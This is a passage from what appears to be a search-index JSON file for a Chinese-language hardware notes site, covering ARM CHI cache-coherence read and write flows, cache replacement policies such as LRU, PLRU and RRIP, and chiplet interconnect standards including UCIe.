Node\uff1a\u200b\u5904\u7406\u200b Home Node \u200b\u6765\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u5185\u5b58\u200b\u6216\u8005\u200b\u663e\u5b58\u200b\u7b49\u200b\u6709\u200b\u5185\u5b58\u200b\u7684\u200b\u5916\u8bbe\u200b</li> </ol> <p>\u200b\u5728\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u4e0b\u200b\uff0cNode \u200b\u4e4b\u95f4\u200b\u53ef\u4ee5\u200b\u4e92\u76f8\u200b\u901a\u4fe1\u200b\uff0c\u200b\u56e0\u6b64\u200b\u65b9\u4fbf\u200b\u505a\u200b\u4e00\u4e9b\u200b\u65b0\u200b\u7684\u200b\u4f18\u5316\u200b\u3002\u200b\u4f8b\u5982\u200b\u4f20\u7edf\u200b\u7684\u200b\u7f13\u5b58\u200b\u5c42\u6b21\u200b\u91cc\u200b\uff0c\u200b\u8bf7\u6c42\u200b\u662f\u200b\u4e00\u7ea7\u200b\u4e00\u7ea7\u200b\u4e0b\u53bb\u200b\uff0c\u200b\u54cd\u5e94\u200b\u518d\u200b\u4e00\u7ea7\u200b\u4e00\u7ea7\u200b\u4e0a\u6765\u200b\u3002\u200b\u4f46\u662f\u200b CHI \u200b\u53ef\u80fd\u200b\u662f\u200b Request Node \u200b\u53d1\u7ed9\u200b Home Node \u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u54cd\u5e94\u200b\u76f4\u63a5\u200b\u7531\u200b Subordinate Node \u200b\u53d1\u9001\u200b\u56de\u200b Request Node \u200b\u4e86\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_7","title":"\u8bfb\u200b\u8bf7\u6c42","text":"<p>CHI \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u590d\u6742\u6027\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u5f88\u591a\u200b\u7684\u200b\u7075\u6d3b\u6027\u200b\uff0c\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b\u6f5c\u5728\u200b\u7684\u200b\u6027\u80fd\u200b\u4f18\u5316\u200b\u7684\u200b\u53ef\u80fd\u200b\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b CHI \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u6709\u200b\u5f88\u200b\u591a\u79cd\u200b\u8fc7\u7a0b\u200b\uff08CHI \u200b\u6807\u51c6\u200b\u7b2c\u200b 2.3.1 \u200b\u7ae0\u8282\u200b\uff09\uff1a</p> <p>\u200b\u7b2c\u4e00\u79cd\u200b\u662f\u200b Home Node \u200b\u76f4\u63a5\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6570\u636e\u200b\uff08Combined response from home\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Requester: CompData\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u4e8c\u79cd\u200b\u662f\u200b Home Node \u200b\u628a\u200b\u54cd\u5e94\u200b\u62c6\u6210\u200b\u4e24\u4efd\u200b\uff0c\u200b\u4e00\u4efd\u200b\u8868\u793a\u200b\u8bfb\u53d6\u200b\u7ed3\u679c\u200b\uff0c\u200b\u4e00\u4efd\u200b\u643a\u5e26\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff08Separate data and response from Home\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Requester: RespSepData\n    Home-&gt;&gt;Requester: DataSepResp\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u4e09\u79cd\u200b\u662f\u200b Home Node \u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u8f6c\u800c\u200b\u8be2\u95ee\u200b Subordinate\uff0cSubordinate \u200b\u628a\u200b\u7ed3\u679c\u200b\u76f4\u63a5\u200b\u53d1\u56de\u200b\u7ed9\u200b\u4e86\u200b Requester\uff08Combined response from Subordinate\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Subordinate\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Subordinate: ReadNoSnp\n    Subordinate-&gt;&gt;Requester: CompData\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u56db\u79cd\u200b\u662f\u200b Home Node \u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\uff0c\u200b\u8f6c\u800c\u200b\u8be2\u95ee\u200b Subordinate\uff0c\u200b\u4f46\u200b\u8fd9\u6b21\u200b\u63d0\u524d\u200b\u544a\u8bc9\u200b Requester \u200b\u8bfb\u53d6\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u6700\u540e\u200b Subordinate \u200b\u628a\u200b\u7ed3\u679c\u200b\u53d1\u56de\u200b\u7ed9\u200b\u4e86\u200b Requester\uff08Response from Home, Data from Subordinate\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Subordinate\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Requester: RespSepData\n    Home-&gt;&gt;Subordinate: ReadNoSnpSep\n    Subordinate-&gt;&gt;Home: ReadReceipt\n    Subordinate-&gt;&gt;Requester: DataSepResp\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u4e94\u79cd\u200b\u662f\u200b\u6570\u636e\u200b\u5728\u200b\u5176\u4ed6\u200b\u7684\u200b Requester Node \u200b\u4e2d\u200b\uff0c\u200b\u6b64\u65f6\u200b Home \u200b\u8d1f\u8d23\u200b Snoop\uff08Forwarding snoop\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Snoopee\n    Requester-&gt;&gt;Home: Read*\n    Home-&gt;&gt;Snoopee: Snp*Fwd\n    Snoopee-&gt;&gt;Requester: CompData\n    Snoopee-&gt;&gt;Home: SnpRespFwded\n    Requester-&gt;&gt;Home: CompAck</code></pre> <p>\u200b\u7b2c\u516d\u79cd\u200b\u662f\u200b MakeReadUnique\uff0c\u200b\u6b64\u65f6\u200b\u53ea\u200b\u66f4\u65b0\u200b\u6743\u9650\u200b\uff0c\u200b\u4e0d\u200b\u6d89\u53ca\u200b\u6570\u636e\u200b\u7684\u200b\u4f20\u8f93\u200b\uff08MakeReadUnique only\uff09\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: MakeReadUnique\n    Home-&gt;&gt;Requester: Comp\n    Requester-&gt;&gt;Home: CompAck</code></pre>"},{"location":"hardware/cache_coherence_protocol.html#_8","title":"\u5199\u200b\u8bf7\u6c42","text":"<p>CHI \u200b\u6807\u51c6\u200b\u7b2c\u200b 2.3.2 \u200b\u63cf\u8ff0\u200b\u4e86\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6d41\u7a0b\u200b\u3002\u200b\u548c\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u4e00\u6837\u200b\uff0c\u200b\u5199\u200b\u8bf7\u6c42\u200b\u4e5f\u200b\u6709\u200b\u5f88\u591a\u200b\u7c7b\u578b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u8fdb\u884c\u200b\u4ecb\u7ecd\u200b\u3002\u200b\u4e0e\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u4e0d\u540c\u200b\u7684\u200b\u70b9\u200b\u5728\u4e8e\u200b\uff0c\u200b\u5199\u5165\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5e76\u200b\u4e0d\u662f\u200b\u76f4\u63a5\u200b\u628a\u200b\u5199\u5165\u200b\u7684\u200b\u5730\u5740\u200b\u548c\u200b\u6570\u636e\u200b\u7b49\u200b\u4e00\u6b21\u6027\u200b\u53d1\u9001\u200b\u8fc7\u53bb\u200b\uff0c\u200b\u800c\u662f\u200b\u5148\u53d1\u200b\u4e00\u4e2a\u200b\u5199\u200b\u6d88\u606f\u200b\uff0c\u200b\u5bf9\u65b9\u200b\u56de\u590d\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u6570\u636e\u200b\u4e86\u200b\uff08DBIDResp\uff09\uff0c\u200b\u518d\u200b\u628a\u200b\u5b9e\u9645\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u8fc7\u53bb\u200b\uff08NCBWrData\uff09\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e2d\u9014\u200b\u53cd\u6094\u200b\uff08WriteDataCancel\uff09\u3002</p> <p>\u200b\u7b2c\u4e00\u79cd\u200b\u662f\u200b Direct Write-data Transfer\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u6570\u636e\u200b\u8981\u200b\u4ece\u200b Requester \u200b\u76f4\u63a5\u200b\u4f20\u5230\u200b Subordinate \u200b\u4e0a\u200b\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    participant Subordinate\n    Requester-&gt;&gt;Home: Write*\n    Home-&gt;&gt;Subordinate: Write*\n    Subordinate-&gt;&gt;Requester: DBIDResp\n    Requester-&gt;&gt;Subordinate: NCBWrData/WriteDataCancel\n    Subordinate-&gt;&gt;Home: Comp\n    Home-&gt;&gt;Requester: Comp</code></pre> <p>\u200b\u7b2c\u4e8c\u79cd\u200b\u6bd4\u8f83\u200b\u5e38\u89c4\u200b\uff0c\u200b\u5c31\u662f\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u7ed9\u200b Home Node\uff0c\u200b\u5176\u4e2d\u200b Comp \u200b\u8868\u793a\u200b\u8bfb\u53d6\u200b\u7ed3\u679c\u200b\uff0cDBIDResp \u200b\u8868\u793a\u200b\u53ef\u4ee5\u200b\u53d1\u200b\u5199\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e86\u200b\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: Write*\n    Home-&gt;&gt;Requester: DBIDResp/DBIDRespOrd\n    Home-&gt;&gt;Requester: Comp\n    Requester-&gt;&gt;Home: NCBWrData/WriteDataCancel</code></pre> <p>\u200b\u7b2c\u4e09\u79cd\u200b\u662f\u200b\u628a\u200b\u7b2c\u4e8c\u79cd\u200b\u7684\u200b DBIDResp \u200b\u548c\u200b Comp \u200b\u5408\u5e76\u200b\u6210\u200b\u4e00\u4e2a\u200b\u54cd\u5e94\u200b\uff1a</p> <pre><code>sequenceDiagram\n    participant Requester\n    participant Home\n    Requester-&gt;&gt;Home: Write*\n    Home-&gt;&gt;Requester: CompDBIDResp\n    Requester-&gt;&gt;Home: NCBWrData/WriteDataCancel</code></pre>"},{"location":"hardware/cache_coherence_protocol.html#_9","title":"\u53c2\u8003\u200b\u6587\u6863","text":"<ul> <li>Cache coherence</li> <li>MSI protocol</li> <li>Write-once (cache coherence)</li> <li>MESI protocol</li> <li>MOESI protocol</li> <li>Dragon protocol</li> <li>A Strategy to Verify an AXI/ACE Compliant Interconnect (2 of 4)</li> <li>Directory-based cache coherence</li> <li>TileLink spec</li> <li>rocket-chip</li> <li>IHI0022E-AMBA AXI and ACE</li> </ul>"},{"location":"hardware/cache_replacement_policy.html","title":"\u7f13\u5b58\u200b\u66ff\u6362\u200b\u7b56\u7565","text":""},{"location":"hardware/cache_replacement_policy.html#lruleast-recently-used","title":"LRU(Least Recently Used)","text":"<p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5c31\u200b\u66f4\u65b0\u200b\u5b83\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u6700\u65e9\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u89c6\u4e3a\u200b\u6bd4\u200b\u5408\u6cd5\u200b\u5143\u7d20\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u90fd\u200b\u66f4\u200b\u65e9\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#plrupseudo-least-recently-used","title":"PLRU(Pseudo Least Recently Used)","text":"<p>\u200b\u7528\u200b\u4e8c\u53c9\u6811\u200b\u6765\u200b\u7ef4\u62a4\u200b\u72b6\u6001\u200b\uff0c\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u5bf9\u5e94\u200b\u5404\u200b\u5143\u7d20\u200b\uff0c\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u8bb0\u5f55\u200b\u96f6\u200b\u6216\u200b\u4e00\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u5de6\u5b50\u6570\u200b\u6216\u200b\u53f3\u5b50\u200b\u6811\u200b\uff0c\u200b\u6307\u5411\u200b\u7684\u200b\u662f\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\u66f4\u200b\u65e9\u200b\u7684\u200b\u5b50\u6811\u200b\u3002\u200b\u5f53\u200b\u8bbf\u95ee\u200b\u5143\u7d20\u200b\u65f6\u200b\uff0c\u200b\u628a\u200b\u4ece\u200b\u6839\u200b\u7ed3\u70b9\u200b\u5230\u200b\u5143\u7d20\u200b\u5bf9\u5e94\u200b\u7684\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u90fd\u200b\u6307\u5411\u200b\u4e0d\u200b\u5728\u200b\u8def\u5f84\u200b\u7684\u200b\u4e00\u4fa7\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6cbf\u7740\u200b\u975e\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u4e0a\u200b\u8bb0\u5f55\u200b\u7684\u200b\u65b9\u5411\u200b\uff0c\u200b\u4e00\u8def\u200b\u8d70\u5230\u200b\u7684\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u8be5\u200b\u7ed3\u70b9\u200b\u5bf9\u5e94\u200b\u8981\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#mrumost-recently-used","title":"MRU(Most Recently Used)","text":"<p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5c31\u200b\u66f4\u65b0\u200b\u5b83\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u6700\u665a\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#lfuleast-frequently-used","title":"LFU(Least Frequently Used)","text":"<p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5c31\u200b\u589e\u52a0\u200b\u4e00\u6b21\u200b\u5b83\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u3002\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u6700\u5c0f\u200b\u7684\u200b\u90a3\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6b21\u6570\u200b\u89c6\u4e3a\u200b\u96f6\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#random","title":"Random","text":"<p>\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u968f\u673a\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u5143\u7d20\u200b\u53bb\u200b\u66ff\u6362\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f18\u5148\u200b\u66ff\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#rripre-reference-interval-prediction","title":"RRIP(Re-Reference Interval Prediction)","text":"<p>\u200b\u8bba\u6587\u200b\uff1aHigh Performance Cache Replacement Using Re-Reference Interval Prediction (RRIP)</p> <p>\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b RRPV\uff08Re-Reference Prediction Value\uff09\u200b\u503c\u200b\u3002\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u8bbf\u95ee\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\uff08Hit Priority \u200b\u65b9\u5f0f\u200b\uff09\u200b\u6216\u8005\u200b\u51cf\u53bb\u200b\u4e00\u200b\uff08Frequency Priority \u200b\u65b9\u5f0f\u200b\uff09\u3002</p> <p>\u200b\u66ff\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed9\u200b\u6240\u6709\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u4e0d\u65ad\u200b\u540c\u65f6\u200b\u52a0\u4e00\u200b\uff0c\u200b\u76f4\u5230\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u7b49\u4e8e\u200b maxRRPV\uff08RRPV \u200b\u53ef\u80fd\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u6700\u5927\u503c\u200b\uff09\uff0c\u200b\u6b64\u65f6\u200b\u5b83\u200b\u5c31\u662f\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\u3002\u200b\u7b49\u4ef7\u200b\u5730\u8bf4\u200b\uff0cRRPV \u200b\u6700\u5927\u200b\u7684\u200b\u5143\u7d20\u200b\u5c31\u662f\u200b\u8981\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\uff0c\u200b\u540c\u65f6\u200b\u589e\u52a0\u200b\u5176\u4f59\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\uff0c\u200b\u589e\u52a0\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u7b49\u4e8e\u200b maxRRPV\uff0c\u200b\u51cf\u53bb\u200b\u88ab\u200b\u66ff\u6362\u200b\u7684\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f18\u5148\u200b\u66ff\u6362\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f18\u5148\u200b\u66ff\u200b\u975e\u6cd5\u200b\u5143\u7d20\u200b\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#srripstatic-rrip","title":"SRRIP(Static RRIP)","text":"<p>RRIP \u200b\u7684\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff1a\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b maxRRPV-1\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#brripbimodel-rrip","title":"BRRIP(Bimodel RRIP)","text":"<p>RRIP \u200b\u7684\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff1a\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0c\u200b\u6309\u7167\u200b\u4e00\u5b9a\u200b\u7684\u200b\u6982\u7387\u200b\uff0c\u200b\u628a\u200b\u5b83\u200b\u7684\u200b RRPV \u200b\u503c\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b maxRRPV \u200b\u6216\u200b maxRRPV-1\u3002</p>"},{"location":"hardware/cache_replacement_policy.html#nrunot-recently-used","title":"NRU(Not Recently Used)","text":"<p>SRRIP \u200b\u7684\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff1aRRPV \u200b\u53ea\u80fd\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u6216\u8005\u200b\u4e00\u200b\uff1b\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0cRRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u3002</p> <p>\u200b\u7b49\u4ef7\u200b\u5730\u8bf4\u200b\uff1a\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u6362\u5165\u200b\u65f6\u200b\uff0cRRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u3002\u200b\u5f53\u200b\u5143\u7d20\u200b\u88ab\u200b\u8bbf\u95ee\u200b\u65f6\u200b\uff0cRRPV \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u96f6\u200b\u3002\u200b\u5728\u200b\u66ff\u6362\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b RRPV \u200b\u7b49\u4e8e\u200b\u4e00\u200b\u7684\u200b\u5143\u7d20\u200b\uff0c\u200b\u5219\u200b\u66ff\u6362\u200b\u5b83\u200b\uff1b\u200b\u5982\u679c\u200b\u6240\u6709\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u90fd\u200b\u7b49\u4e8e\u96f6\u200b\uff0c\u200b\u5219\u200b\u66ff\u6362\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u5e76\u200b\u628a\u200b\u5269\u4e0b\u200b\u7684\u200b\u5143\u7d20\u200b\u7684\u200b RRPV \u200b\u90fd\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e00\u200b\u3002</p>"},{"location":"hardware/chiplet.html","title":"Chiplet Interface","text":""},{"location":"hardware/chiplet.html#acc-rv-road-vehicles-advanced-cost-driven-chiplet-interface","title":"ACC RV (Road vehicles - Advanced Cost-driven Chiplet Interface) \u200b\u8f66\u89c4\u7ea7\u200b\u82af\u7c92\u200b\u4e92\u8054\u200b\u63a5\u53e3\u6807\u51c6","text":"<p>\u200b\u8f66\u89c4\u7ea7\u200b\u82af\u7c92\u200b\u4e92\u8054\u200b\u63a5\u53e3\u6807\u51c6\u200b \u2013 \u200b\u8349\u6848\u200b</p> <p>Road vehicles - Advanced Cost-driven Chiplet Interface (ACC_RV 1.0)</p> <p>\u200b\u6807\u51c6\u200b\u94fe\u63a5\u200b\uff1ahttp://www.iiisct.com/smart/upload/CMS1/202303/ACC_RV%201.0.pdf</p> <p>ACC RV 1.0 \u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u5c42\u6b21\u200b\uff1a</p> <ol> <li>\u200b\u534f\u8bae\u200b\u5c42\u200b Protocol Layer\uff1a\u200b\u652f\u6301\u200b CXL 3.0\uff08Standard 256B Flit\uff09\uff0cAXI 4.0 \u200b\u6216\u8005\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b Stream \u200b\u534f\u8bae\u200b</li> <li>\u200b\u94fe\u8def\u5c42\u200b Link Layer\uff1a\u200b\u53ef\u9760\u200b\u4f20\u8f93\u200b\uff0c\u200b\u94fe\u8def\u200b\u9002\u914d\u200b</li> <li>\u200b\u6570\u5b57\u200b\u7269\u7406\u5c42\u200b Digital Physical Layer</li> <li>\u200b\u7535\u6c14\u200b\u7269\u7406\u5c42\u200b Electrical Physical Layer</li> </ol>"},{"location":"hardware/chiplet.html#bow-bunch-of-wires","title":"BoW (Bunch of Wires)","text":"<p>Specification: https://opencomputeproject.github.io/ODSA-BoW/bow_specification.html https://www.opencompute.org/documents/bow-specification-v2-0d-1-pdf https://www.opencompute.org/documents/bunch-of-wires-phy-specification-pdf</p>"},{"location":"hardware/chiplet.html#ucie-universal-chiplet-interconnect-express","title":"UCIe (Universal Chiplet Interconnect Express)","text":"<p>UCIe \u200b\u7684\u200b\u6807\u51c6\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5b98\u200b\u7f51\u4e0a\u200b\u7533\u8bf7\u200b\uff0c\u200b\u7533\u8bf7\u200b\u540e\u8fc7\u200b\u51e0\u5929\u200b\u4f1a\u200b\u5728\u200b\u90ae\u7bb1\u200b\u91cc\u200b\u6536\u5230\u200b UCIe \u200b\u7684\u200b\u6807\u51c6\u200b PDF\u3002\u200b\u4e0b\u6587\u200b\u53c2\u8003\u200b\u7684\u200b\u662f\u200b UCIe 1.1\uff082023 \u200b\u5e74\u200b 7 \u200b\u6708\u200b 10 \u200b\u65e5\u200b \u200b\u7248\u672c\u200b\uff09\u3002\u200b\u6309\u7167\u200b UCIe \u200b\u6807\u51c6\u200b\u8981\u6c42\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5217\u51fa\u200b UCIe \u200b\u6807\u51c6\u200b\u7684\u200b\u7248\u6743\u200b\u4fe1\u606f\u200b\uff1a <code>\u00a9 2022\u20132023 UNIVERSAL CHIPLET INTERCONNECT EXPRESS, INC. ALL RIGHTS RESERVED</code>\u3002</p>"},{"location":"hardware/chiplet.html#_1","title":"\u4ecb\u7ecd","text":"<p>UCIe \u200b\u662f\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b Chiplet \u200b\u7684\u200b\u4e92\u8054\u200b\u534f\u8bae\u200b\uff0c\u200b\u628a\u200b\u4e00\u4e2a\u200b package \u200b\u4e0a\u200b\u7684\u200b\u591a\u4e2a\u200b die 